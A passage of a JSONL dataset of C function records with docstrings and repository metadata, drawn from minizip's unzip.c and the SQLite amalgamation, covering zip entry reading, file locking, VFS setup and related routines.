&& (size_filename!=s->cur_file_info.size_filename))\n        err=UNZ_BADZIPFILE;\n\n    *piSizeVar += (uInt)size_filename;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&size_extra_field) != UNZ_OK)\n        err=UNZ_ERRNO;\n    *poffset_local_extrafield= s->cur_file_info_internal.offset_curfile +\n                                    SIZEZIPLOCALHEADER + size_filename;\n    *psize_local_extrafield = (uInt)size_extra_field;\n\n    *piSizeVar += (uInt)size_extra_field;\n\n    return err;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/* Additions by RX '2004 */\n", "func_signal": "extern ZPOS64_T ZEXPORT unzGetOffset64(unzFile file)", "code": "{\n    unz64_s* s;\n\n    if (file==NULL)\n          return 0; //UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n      return 0;\n    if (s->gi.number_entry != 0 && s->gi.number_entry != 0xffff)\n      if (s->num_file==s->gi.number_entry)\n         return 0;\n    return s->pos_in_central_dir;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n  Give the current position in uncompressed data\n*/\n", "func_signal": "extern z_off_t ZEXPORT unztell (unzFile file)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    return (z_off_t)pfile_in_zip_read_info->stream.total_out;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n  Read bytes from the current file.\n  buf contain buffer where data must be copied\n  len the size of buf.\n\n  return the number of byte copied if somes bytes are copied\n  return 0 if the end of file was reached\n  return <0 with error code if there is an error\n    (UNZ_ERRNO for IO error, or zLib error for uncompress error)\n*/\n", "func_signal": "extern int ZEXPORT unzReadCurrentFile  (unzFile file, voidp buf, unsigned len)", "code": "{\n    int err=UNZ_OK;\n    uInt iRead = 0;\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n\n    if ((pfile_in_zip_read_info->read_buffer == NULL))\n        return UNZ_END_OF_LIST_OF_FILE;\n    if (len==0)\n        return 0;\n\n    pfile_in_zip_read_info->stream.next_out = (Bytef*)buf;\n\n    pfile_in_zip_read_info->stream.avail_out = (uInt)len;\n\n    if ((len>pfile_in_zip_read_info->rest_read_uncompressed) &&\n        (!(pfile_in_zip_read_info->raw)))\n        pfile_in_zip_read_info->stream.avail_out =\n            (uInt)pfile_in_zip_read_info->rest_read_uncompressed;\n\n    if ((len>pfile_in_zip_read_info->rest_read_compressed+\n           pfile_in_zip_read_info->stream.avail_in) &&\n         (pfile_in_zip_read_info->raw))\n        pfile_in_zip_read_info->stream.avail_out =\n            (uInt)pfile_in_zip_read_info->rest_read_compressed+\n            pfile_in_zip_read_info->stream.avail_in;\n\n    while (pfile_in_zip_read_info->stream.avail_out>0)\n    {\n        if ((pfile_in_zip_read_info->stream.avail_in==0) &&\n            (pfile_in_zip_read_info->rest_read_compressed>0))\n        {\n            uInt uReadThis = UNZ_BUFSIZE;\n            if (pfile_in_zip_read_info->rest_read_compressed<uReadThis)\n                uReadThis = (uInt)pfile_in_zip_read_info->rest_read_compressed;\n            if (uReadThis == 0)\n                return UNZ_EOF;\n            if (ZSEEK64(pfile_in_zip_read_info->z_filefunc,\n                      pfile_in_zip_read_info->filestream,\n                      pfile_in_zip_read_info->pos_in_zipfile +\n                         pfile_in_zip_read_info->byte_before_the_zipfile,\n                         ZLIB_FILEFUNC_SEEK_SET)!=0)\n                return UNZ_ERRNO;\n            if (ZREAD64(pfile_in_zip_read_info->z_filefunc,\n                      pfile_in_zip_read_info->filestream,\n                      pfile_in_zip_read_info->read_buffer,\n                      uReadThis)!=uReadThis)\n                return UNZ_ERRNO;\n\n\n#            ifndef NOUNCRYPT\n            if(s->encrypted)\n            {\n                uInt i;\n                for(i=0;i<uReadThis;i++)\n                  pfile_in_zip_read_info->read_buffer[i] =\n                      zdecode(s->keys,s->pcrc_32_tab,\n                              pfile_in_zip_read_info->read_buffer[i]);\n            }\n#            endif\n\n\n            pfile_in_zip_read_info->pos_in_zipfile += uReadThis;\n\n            pfile_in_zip_read_info->rest_read_compressed-=uReadThis;\n\n            pfile_in_zip_read_info->stream.next_in =\n                (Bytef*)pfile_in_zip_read_info->read_buffer;\n            pfile_in_zip_read_info->stream.avail_in = (uInt)uReadThis;\n        }\n\n        if ((pfile_in_zip_read_info->compression_method==0) || (pfile_in_zip_read_info->raw))\n        {\n            uInt uDoCopy,i ;\n\n            if ((pfile_in_zip_read_info->stream.avail_in == 0) &&\n                (pfile_in_zip_read_info->rest_read_compressed == 0))\n                return (iRead==0) ? UNZ_EOF : iRead;\n\n            if (pfile_in_zip_read_info->stream.avail_out <\n                            pfile_in_zip_read_info->stream.avail_in)\n                uDoCopy = pfile_in_zip_read_info->stream.avail_out ;\n            else\n                uDoCopy = pfile_in_zip_read_info->stream.avail_in ;\n\n            for (i=0;i<uDoCopy;i++)\n                *(pfile_in_zip_read_info->stream.next_out+i) =\n                        *(pfile_in_zip_read_info->stream.next_in+i);\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uDoCopy;\n\n            pfile_in_zip_read_info->crc32 = crc32(pfile_in_zip_read_info->crc32,\n                                pfile_in_zip_read_info->stream.next_out,\n                                uDoCopy);\n            pfile_in_zip_read_info->rest_read_uncompressed-=uDoCopy;\n            pfile_in_zip_read_info->stream.avail_in -= uDoCopy;\n            pfile_in_zip_read_info->stream.avail_out -= uDoCopy;\n            pfile_in_zip_read_info->stream.next_out += uDoCopy;\n            pfile_in_zip_read_info->stream.next_in += uDoCopy;\n            pfile_in_zip_read_info->stream.total_out += uDoCopy;\n            iRead += uDoCopy;\n        }\n        else if (pfile_in_zip_read_info->compression_method==Z_BZIP2ED)\n        {\n#ifdef HAVE_BZIP2\n            uLong uTotalOutBefore,uTotalOutAfter;\n            const Bytef *bufBefore;\n            uLong uOutThis;\n\n            pfile_in_zip_read_info->bstream.next_in        = (char*)pfile_in_zip_read_info->stream.next_in;\n            pfile_in_zip_read_info->bstream.avail_in       = pfile_in_zip_read_info->stream.avail_in;\n            pfile_in_zip_read_info->bstream.total_in_lo32  = pfile_in_zip_read_info->stream.total_in;\n            pfile_in_zip_read_info->bstream.total_in_hi32  = 0;\n            pfile_in_zip_read_info->bstream.next_out       = (char*)pfile_in_zip_read_info->stream.next_out;\n            pfile_in_zip_read_info->bstream.avail_out      = pfile_in_zip_read_info->stream.avail_out;\n            pfile_in_zip_read_info->bstream.total_out_lo32 = pfile_in_zip_read_info->stream.total_out;\n            pfile_in_zip_read_info->bstream.total_out_hi32 = 0;\n\n            uTotalOutBefore = pfile_in_zip_read_info->bstream.total_out_lo32;\n            bufBefore = (const Bytef *)pfile_in_zip_read_info->bstream.next_out;\n\n            err=BZ2_bzDecompress(&pfile_in_zip_read_info->bstream);\n\n            uTotalOutAfter = pfile_in_zip_read_info->bstream.total_out_lo32;\n            uOutThis = uTotalOutAfter-uTotalOutBefore;\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uOutThis;\n\n            pfile_in_zip_read_info->crc32 = crc32(pfile_in_zip_read_info->crc32,bufBefore, (uInt)(uOutThis));\n            pfile_in_zip_read_info->rest_read_uncompressed -= uOutThis;\n            iRead += (uInt)(uTotalOutAfter - uTotalOutBefore);\n\n            pfile_in_zip_read_info->stream.next_in   = (Bytef*)pfile_in_zip_read_info->bstream.next_in;\n            pfile_in_zip_read_info->stream.avail_in  = pfile_in_zip_read_info->bstream.avail_in;\n            pfile_in_zip_read_info->stream.total_in  = pfile_in_zip_read_info->bstream.total_in_lo32;\n            pfile_in_zip_read_info->stream.next_out  = (Bytef*)pfile_in_zip_read_info->bstream.next_out;\n            pfile_in_zip_read_info->stream.avail_out = pfile_in_zip_read_info->bstream.avail_out;\n            pfile_in_zip_read_info->stream.total_out = pfile_in_zip_read_info->bstream.total_out_lo32;\n\n            if (err==BZ_STREAM_END)\n              return (iRead==0) ? UNZ_EOF : iRead;\n            if (err!=BZ_OK)\n              break;\n#endif\n        } // end Z_BZIP2ED\n        else\n        {\n            ZPOS64_T uTotalOutBefore,uTotalOutAfter;\n            const Bytef *bufBefore;\n            ZPOS64_T uOutThis;\n            int flush=Z_SYNC_FLUSH;\n\n            uTotalOutBefore = pfile_in_zip_read_info->stream.total_out;\n            bufBefore = pfile_in_zip_read_info->stream.next_out;\n\n            /*\n            if ((pfile_in_zip_read_info->rest_read_uncompressed ==\n                     pfile_in_zip_read_info->stream.avail_out) &&\n                (pfile_in_zip_read_info->rest_read_compressed == 0))\n                flush = Z_FINISH;\n            */\n            err=inflate(&pfile_in_zip_read_info->stream,flush);\n\n            if ((err>=0) && (pfile_in_zip_read_info->stream.msg!=NULL))\n              err = Z_DATA_ERROR;\n\n            uTotalOutAfter = pfile_in_zip_read_info->stream.total_out;\n            uOutThis = uTotalOutAfter-uTotalOutBefore;\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uOutThis;\n\n            pfile_in_zip_read_info->crc32 =\n                crc32(pfile_in_zip_read_info->crc32,bufBefore,\n                        (uInt)(uOutThis));\n\n            pfile_in_zip_read_info->rest_read_uncompressed -=\n                uOutThis;\n\n            iRead += (uInt)(uTotalOutAfter - uTotalOutBefore);\n\n            if (err==Z_STREAM_END)\n                return (iRead==0) ? UNZ_EOF : iRead;\n            if (err!=Z_OK)\n                break;\n        }\n    }\n\n    if (err==Z_OK)\n        return iRead;\n    return err;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n  Set the current file of the zipfile to the first file.\n  return UNZ_OK if there is no problem\n*/\n", "func_signal": "extern int ZEXPORT unzGoToFirstFile (unzFile file)", "code": "{\n    int err=UNZ_OK;\n    unz64_s* s;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    s->pos_in_central_dir=s->offset_central_dir;\n    s->num_file=0;\n    err=unz64local_GetCurrentFileInfoInternal(file,&s->cur_file_info,\n                                             &s->cur_file_info_internal,\n                                             NULL,0,NULL,0,NULL,0);\n    s->current_file_ok = (err == UNZ_OK);\n    return err;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n** Lock the file with the lock specified by parameter eFileLock - one\n** of the following:\n**\n**     (1) SHARED_LOCK\n**     (2) RESERVED_LOCK\n**     (3) PENDING_LOCK\n**     (4) EXCLUSIVE_LOCK\n**\n** Sometimes when requesting one lock state, additional lock states\n** are inserted in between.  The locking might fail on one of the later\n** transitions leaving the lock state different from what it started but\n** still short of its goal.  The following chart shows the allowed\n** transitions and the inserted intermediate states:\n**\n**    UNLOCKED -> SHARED\n**    SHARED -> RESERVED\n**    SHARED -> (PENDING) -> EXCLUSIVE\n**    RESERVED -> (PENDING) -> EXCLUSIVE\n**    PENDING -> EXCLUSIVE\n**\n** This routine will only increase a lock.  Use the sqlite3OsUnlock()\n** routine to lower a locking level.\n*/\n", "func_signal": "static int unixLock(sqlite3_file *id, int eFileLock)", "code": "{\n  /* The following describes the implementation of the various locks and\n  ** lock transitions in terms of the POSIX advisory shared and exclusive\n  ** lock primitives (called read-locks and write-locks below, to avoid\n  ** confusion with SQLite lock names). The algorithms are complicated\n  ** slightly in order to be compatible with windows systems simultaneously\n  ** accessing the same database file, in case that is ever required.\n  **\n  ** Symbols defined in os.h indentify the 'pending byte' and the 'reserved\n  ** byte', each single bytes at well known offsets, and the 'shared byte\n  ** range', a range of 510 bytes at a well known offset.\n  **\n  ** To obtain a SHARED lock, a read-lock is obtained on the 'pending\n  ** byte'.  If this is successful, a random byte from the 'shared byte\n  ** range' is read-locked and the lock on the 'pending byte' released.\n  **\n  ** A process may only obtain a RESERVED lock after it has a SHARED lock.\n  ** A RESERVED lock is implemented by grabbing a write-lock on the\n  ** 'reserved byte'. \n  **\n  ** A process may only obtain a PENDING lock after it has obtained a\n  ** SHARED lock. A PENDING lock is implemented by obtaining a write-lock\n  ** on the 'pending byte'. This ensures that no new SHARED locks can be\n  ** obtained, but existing SHARED locks are allowed to persist. A process\n  ** does not have to obtain a RESERVED lock on the way to a PENDING lock.\n  ** This property is used by the algorithm for rolling back a journal file\n  ** after a crash.\n  **\n  ** An EXCLUSIVE lock, obtained after a PENDING lock is held, is\n  ** implemented by obtaining a write-lock on the entire 'shared byte\n  ** range'. Since all other locks require a read-lock on one of the bytes\n  ** within this range, this ensures that no other locks are held on the\n  ** database. \n  **\n  ** The reason a single byte cannot be used instead of the 'shared byte\n  ** range' is that some versions of windows do not support read-locks. By\n  ** locking a random byte from a range, concurrent SHARED locks may exist\n  ** even if the locking primitive used is always a write-lock.\n  */\n  int rc = SQLITE_OK;\n  unixFile *pFile = (unixFile*)id;\n  unixInodeInfo *pInode;\n  struct flock lock;\n  int tErrno = 0;\n\n  assert( pFile );\n  OSTRACE((\"LOCK    %d %s was %s(%s,%d) pid=%d (unix)\\n\", pFile->h,\n      azFileLock(eFileLock), azFileLock(pFile->eFileLock),\n      azFileLock(pFile->pInode->eFileLock), pFile->pInode->nShared , getpid()));\n\n  /* If there is already a lock of this type or more restrictive on the\n  ** unixFile, do nothing. Don't use the end_lock: exit path, as\n  ** unixEnterMutex() hasn't been called yet.\n  */\n  if( pFile->eFileLock>=eFileLock ){\n    OSTRACE((\"LOCK    %d %s ok (already held) (unix)\\n\", pFile->h,\n            azFileLock(eFileLock)));\n    return SQLITE_OK;\n  }\n\n  /* Make sure the locking sequence is correct.\n  **  (1) We never move from unlocked to anything higher than shared lock.\n  **  (2) SQLite never explicitly requests a pendig lock.\n  **  (3) A shared lock is always held when a reserve lock is requested.\n  */\n  assert( pFile->eFileLock!=NO_LOCK || eFileLock==SHARED_LOCK );\n  assert( eFileLock!=PENDING_LOCK );\n  assert( eFileLock!=RESERVED_LOCK || pFile->eFileLock==SHARED_LOCK );\n\n  /* This mutex is needed because pFile->pInode is shared across threads\n  */\n  unixEnterMutex();\n  pInode = pFile->pInode;\n\n  /* If some thread using this PID has a lock via a different unixFile*\n  ** handle that precludes the requested lock, return BUSY.\n  */\n  if( (pFile->eFileLock!=pInode->eFileLock && \n          (pInode->eFileLock>=PENDING_LOCK || eFileLock>SHARED_LOCK))\n  ){\n    rc = SQLITE_BUSY;\n    goto end_lock;\n  }\n\n  /* If a SHARED lock is requested, and some thread using this PID already\n  ** has a SHARED or RESERVED lock, then increment reference counts and\n  ** return SQLITE_OK.\n  */\n  if( eFileLock==SHARED_LOCK && \n      (pInode->eFileLock==SHARED_LOCK || pInode->eFileLock==RESERVED_LOCK) ){\n    assert( eFileLock==SHARED_LOCK );\n    assert( pFile->eFileLock==0 );\n    assert( pInode->nShared>0 );\n    pFile->eFileLock = SHARED_LOCK;\n    pInode->nShared++;\n    pInode->nLock++;\n    goto end_lock;\n  }\n\n\n  /* A PENDING lock is needed before acquiring a SHARED lock and before\n  ** acquiring an EXCLUSIVE lock.  For the SHARED lock, the PENDING will\n  ** be released.\n  */\n  lock.l_len = 1L;\n  lock.l_whence = SEEK_SET;\n  if( eFileLock==SHARED_LOCK \n      || (eFileLock==EXCLUSIVE_LOCK && pFile->eFileLock<PENDING_LOCK)\n  ){\n    lock.l_type = (eFileLock==SHARED_LOCK?F_RDLCK:F_WRLCK);\n    lock.l_start = PENDING_BYTE;\n    if( unixFileLock(pFile, &lock) ){\n      tErrno = errno;\n      rc = sqliteErrorFromPosixError(tErrno, SQLITE_IOERR_LOCK);\n      if( rc!=SQLITE_BUSY ){\n        pFile->lastErrno = tErrno;\n      }\n      goto end_lock;\n    }\n  }\n\n\n  /* If control gets to this point, then actually go ahead and make\n  ** operating system calls for the specified lock.\n  */\n  if( eFileLock==SHARED_LOCK ){\n    assert( pInode->nShared==0 );\n    assert( pInode->eFileLock==0 );\n    assert( rc==SQLITE_OK );\n\n    /* Now get the read-lock */\n    lock.l_start = SHARED_FIRST;\n    lock.l_len = SHARED_SIZE;\n    if( unixFileLock(pFile, &lock) ){\n      tErrno = errno;\n      rc = sqliteErrorFromPosixError(tErrno, SQLITE_IOERR_LOCK);\n    }\n\n    /* Drop the temporary PENDING lock */\n    lock.l_start = PENDING_BYTE;\n    lock.l_len = 1L;\n    lock.l_type = F_UNLCK;\n    if( unixFileLock(pFile, &lock) && rc==SQLITE_OK ){\n      /* This could happen with a network mount */\n      tErrno = errno;\n      rc = SQLITE_IOERR_UNLOCK; \n    }\n\n    if( rc ){\n      if( rc!=SQLITE_BUSY ){\n        pFile->lastErrno = tErrno;\n      }\n      goto end_lock;\n    }else{\n      pFile->eFileLock = SHARED_LOCK;\n      pInode->nLock++;\n      pInode->nShared = 1;\n    }\n  }else if( eFileLock==EXCLUSIVE_LOCK && pInode->nShared>1 ){\n    /* We are trying for an exclusive lock but another thread in this\n    ** same process is still holding a shared lock. */\n    rc = SQLITE_BUSY;\n  }else{\n    /* The request was for a RESERVED or EXCLUSIVE lock.  It is\n    ** assumed that there is a SHARED or greater lock on the file\n    ** already.\n    */\n    assert( 0!=pFile->eFileLock );\n    lock.l_type = F_WRLCK;\n\n    assert( eFileLock==RESERVED_LOCK || eFileLock==EXCLUSIVE_LOCK );\n    if( eFileLock==RESERVED_LOCK ){\n      lock.l_start = RESERVED_BYTE;\n      lock.l_len = 1L;\n    }else{\n      lock.l_start = SHARED_FIRST;\n      lock.l_len = SHARED_SIZE;\n    }\n\n    if( unixFileLock(pFile, &lock) ){\n      tErrno = errno;\n      rc = sqliteErrorFromPosixError(tErrno, SQLITE_IOERR_LOCK);\n      if( rc!=SQLITE_BUSY ){\n        pFile->lastErrno = tErrno;\n      }\n    }\n  }\n  \n\n#ifndef NDEBUG\n  /* Set up the transaction-counter change checking flags when\n  ** transitioning from a SHARED to a RESERVED lock.  The change\n  ** from SHARED to RESERVED marks the beginning of a normal\n  ** write operation (not a hot journal rollback).\n  */\n  if( rc==SQLITE_OK\n   && pFile->eFileLock<=SHARED_LOCK\n   && eFileLock==RESERVED_LOCK\n  ){\n    pFile->transCntrChng = 0;\n    pFile->dbUpdate = 0;\n    pFile->inNormalWrite = 1;\n  }\n#endif\n\n\n  if( rc==SQLITE_OK ){\n    pFile->eFileLock = eFileLock;\n    pInode->eFileLock = eFileLock;\n  }else if( eFileLock==EXCLUSIVE_LOCK ){\n    pFile->eFileLock = PENDING_LOCK;\n    pInode->eFileLock = PENDING_LOCK;\n  }\n\nend_lock:\n  unixLeaveMutex();\n  OSTRACE((\"LOCK    %d %s %s (unix)\\n\", pFile->h, azFileLock(eFileLock), \n      rc==SQLITE_OK ? \"ok\" : \"failed\"));\n  return rc;\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Add MEM_Str to the set of representations for the given Mem.  Numbers\n** are converted using sqlite3_snprintf().  Converting a BLOB to a string\n** is a no-op.\n**\n** Existing representations MEM_Int and MEM_Real are *not* invalidated.\n**\n** A MEM_Null value will never be passed to this function. This function is\n** used for converting values to text for returning to the user (i.e. via\n** sqlite3_value_text()), or for ensuring that values to be used as btree\n** keys are strings. In the former case a NULL pointer is returned the\n** user and the later is an internal programming error.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3VdbeMemStringify(Mem *pMem, int enc)", "code": "{\n  int rc = SQLITE_OK;\n  int fg = pMem->flags;\n  const int nByte = 32;\n\n  assert( pMem->db==0 || sqlite3_mutex_held(pMem->db->mutex) );\n  assert( !(fg&MEM_Zero) );\n  assert( !(fg&(MEM_Str|MEM_Blob)) );\n  assert( fg&(MEM_Int|MEM_Real) );\n  assert( (pMem->flags&MEM_RowSet)==0 );\n  assert( EIGHT_BYTE_ALIGNMENT(pMem) );\n\n\n  if( sqlite3VdbeMemGrow(pMem, nByte, 0) ){\n    return SQLITE_NOMEM;\n  }\n\n  /* For a Real or Integer, use sqlite3_mprintf() to produce the UTF-8\n  ** string representation of the value. Then, if the required encoding\n  ** is UTF-16le or UTF-16be do a translation.\n  ** \n  ** FIX ME: It would be better if sqlite3_snprintf() could do UTF-16.\n  */\n  if( fg & MEM_Int ){\n    sqlite3_snprintf(nByte, pMem->z, \"%lld\", pMem->u.i);\n  }else{\n    assert( fg & MEM_Real );\n    sqlite3_snprintf(nByte, pMem->z, \"%!.15g\", pMem->r);\n  }\n  pMem->n = sqlite3Strlen30(pMem->z);\n  pMem->enc = SQLITE_UTF8;\n  pMem->flags |= MEM_Str|MEM_Term;\n  sqlite3VdbeChangeEncoding(pMem, enc);\n  return rc;\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Initialize the operating system interface.\n**\n** This routine registers all VFS implementations for unix-like operating\n** systems.  This routine, and the sqlite3_os_end() routine that follows,\n** should be the only routines in this file that are visible from other\n** files.\n**\n** This routine is called once during SQLite initialization and by a\n** single thread.  The memory allocation and mutex subsystems have not\n** necessarily been initialized when this routine is called, and so they\n** should not be used.\n*/\n", "func_signal": "SQLITE_API int sqlite3_os_init(void)", "code": "{ \n  /* \n  ** The following macro defines an initializer for an sqlite3_vfs object.\n  ** The name of the VFS is NAME.  The pAppData is a pointer to a pointer\n  ** to the \"finder\" function.  (pAppData is a pointer to a pointer because\n  ** silly C90 rules prohibit a void* from being cast to a function pointer\n  ** and so we have to go through the intermediate pointer to avoid problems\n  ** when compiling with -pedantic-errors on GCC.)\n  **\n  ** The FINDER parameter to this macro is the name of the pointer to the\n  ** finder-function.  The finder-function returns a pointer to the\n  ** sqlite_io_methods object that implements the desired locking\n  ** behaviors.  See the division above that contains the IOMETHODS\n  ** macro for addition information on finder-functions.\n  **\n  ** Most finders simply return a pointer to a fixed sqlite3_io_methods\n  ** object.  But the \"autolockIoFinder\" available on MacOSX does a little\n  ** more than that; it looks at the filesystem type that hosts the \n  ** database file and tries to choose an locking method appropriate for\n  ** that filesystem time.\n  */\n  #define UNIXVFS(VFSNAME, FINDER) {                        \\\n    3,                    /* iVersion */                    \\\n    sizeof(unixFile),     /* szOsFile */                    \\\n    MAX_PATHNAME,         /* mxPathname */                  \\\n    0,                    /* pNext */                       \\\n    VFSNAME,              /* zName */                       \\\n    (void*)&FINDER,       /* pAppData */                    \\\n    unixOpen,             /* xOpen */                       \\\n    unixDelete,           /* xDelete */                     \\\n    unixAccess,           /* xAccess */                     \\\n    unixFullPathname,     /* xFullPathname */               \\\n    unixDlOpen,           /* xDlOpen */                     \\\n    unixDlError,          /* xDlError */                    \\\n    unixDlSym,            /* xDlSym */                      \\\n    unixDlClose,          /* xDlClose */                    \\\n    unixRandomness,       /* xRandomness */                 \\\n    unixSleep,            /* xSleep */                      \\\n    unixCurrentTime,      /* xCurrentTime */                \\\n    unixGetLastError,     /* xGetLastError */               \\\n    unixCurrentTimeInt64, /* xCurrentTimeInt64 */           \\\n    unixSetSystemCall,    /* xSetSystemCall */              \\\n    unixGetSystemCall,    /* xGetSystemCall */              \\\n    unixNextSystemCall,   /* xNextSystemCall */             \\\n  }\n\n  /*\n  ** All default VFSes for unix are contained in the following array.\n  **\n  ** Note that the sqlite3_vfs.pNext field of the VFS object is modified\n  ** by the SQLite core when the VFS is registered.  So the following\n  ** array cannot be const.\n  */\n  static sqlite3_vfs aVfs[] = {\n#if SQLITE_ENABLE_LOCKING_STYLE && (OS_VXWORKS || defined(__APPLE__))\n    UNIXVFS(\"unix\",          autolockIoFinder ),\n#else\n    UNIXVFS(\"unix\",          posixIoFinder ),\n#endif\n    UNIXVFS(\"unix-none\",     nolockIoFinder ),\n    UNIXVFS(\"unix-dotfile\",  dotlockIoFinder ),\n    UNIXVFS(\"unix-excl\",     posixIoFinder ),\n#if OS_VXWORKS\n    UNIXVFS(\"unix-namedsem\", semIoFinder ),\n#endif\n#if SQLITE_ENABLE_LOCKING_STYLE\n    UNIXVFS(\"unix-posix\",    posixIoFinder ),\n#if !OS_VXWORKS\n    UNIXVFS(\"unix-flock\",    flockIoFinder ),\n#endif\n#endif\n#if SQLITE_ENABLE_LOCKING_STYLE && defined(__APPLE__)\n    UNIXVFS(\"unix-afp\",      afpIoFinder ),\n    UNIXVFS(\"unix-nfs\",      nfsIoFinder ),\n    UNIXVFS(\"unix-proxy\",    proxyIoFinder ),\n#endif\n  };\n  unsigned int i;          /* Loop counter */\n\n  /* Double-check that the aSyscall[] array has been constructed\n  ** correctly.  See ticket [bb3a86e890c8e96ab] */\n  assert( ArraySize(aSyscall)==22 );\n\n  /* Register all VFSes defined in the aVfs[] array */\n  for(i=0; i<(sizeof(aVfs)/sizeof(sqlite3_vfs)); i++){\n    sqlite3_vfs_register(&aVfs[i], i==0);\n  }\n  return SQLITE_OK; \n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Create a string from the zFromat argument and the va_list that follows.\n** Store the string in memory obtained from sqliteMalloc() and make *pz\n** point to that string.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3SetString(char **pz, sqlite3 *db, const char *zFormat, ...)", "code": "{\n  va_list ap;\n  char *z;\n\n  va_start(ap, zFormat);\n  z = sqlite3VMPrintf(db, zFormat, ap);\n  va_end(ap);\n  sqlite3DbFree(db, *pz);\n  *pz = z;\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Return the size in bytes of a PCache object.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3PcacheSize(void)", "code": "{ return sizeof(PCache); }\n\n/*\n** Create a new PCache object. Storage space to hold the object\n** has already been allocated and is passed in as the p pointer. \n** The caller discovers how much space needs to be allocated by \n** calling sqlite3PcacheSize().\n*/\nSQLITE_PRIVATE void sqlite3PcacheOpen(\n  int szPage,                  /* Size of every page */\n  int szExtra,                 /* Extra space associated with each page */\n  int bPurgeable,              /* True if pages are on backing store */\n  int (*xStress)(void*,PgHdr*),/* Call to try to make pages clean */\n  void *pStress,               /* Argument to xStress */\n  PCache *p                    /* Preallocated space for the PCache */\n){\n  memset(p, 0, sizeof(PCache));\n  p->szPage = szPage;\n  p->szExtra = szExtra;\n  p->bPurgeable = bPurgeable;\n  p->xStress = xStress;\n  p->pStress = pStress;\n  p->szCache = 100;\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Sleep for a little while.  Return the amount of time slept.\n** The argument is the number of microseconds we want to sleep.\n** The return value is the number of microseconds of sleep actually\n** requested from the underlying operating system, a number which\n** might be greater than or equal to the argument, but not less\n** than the argument.\n*/\n", "func_signal": "static int unixSleep(sqlite3_vfs *NotUsed, int microseconds)", "code": "{\n#if OS_VXWORKS\n  struct timespec sp;\n\n  sp.tv_sec = microseconds / 1000000;\n  sp.tv_nsec = (microseconds % 1000000) * 1000;\n  nanosleep(&sp, NULL);\n  UNUSED_PARAMETER(NotUsed);\n  return microseconds;\n#elif defined(HAVE_USLEEP) && HAVE_USLEEP\n  usleep(microseconds);\n  UNUSED_PARAMETER(NotUsed);\n  return microseconds;\n#else\n  int seconds = (microseconds+999999)/1000000;\n  sleep(seconds);\n  UNUSED_PARAMETER(NotUsed);\n  return seconds*1000000;\n#endif\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Deprecated external interface.  Internal/core SQLite code\n** should call sqlite3TransferBindings.\n**\n** Is is misuse to call this routine with statements from different\n** database connections.  But as this is a deprecated interface, we\n** will not bother to check for that condition.\n**\n** If the two statements contain a different number of bindings, then\n** an SQLITE_ERROR is returned.  Nothing else can go wrong, so otherwise\n** SQLITE_OK is returned.\n*/\n", "func_signal": "SQLITE_API int sqlite3_transfer_bindings(sqlite3_stmt *pFromStmt, sqlite3_stmt *pToStmt)", "code": "{\n  Vdbe *pFrom = (Vdbe*)pFromStmt;\n  Vdbe *pTo = (Vdbe*)pToStmt;\n  if( pFrom->nVar!=pTo->nVar ){\n    return SQLITE_ERROR;\n  }\n  if( pTo->isPrepareV2 && pTo->expmask ){\n    pTo->expired = 1;\n  }\n  if( pFrom->isPrepareV2 && pFrom->expmask ){\n    pFrom->expired = 1;\n  }\n  return sqlite3TransferBindings(pFromStmt, pToStmt);\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
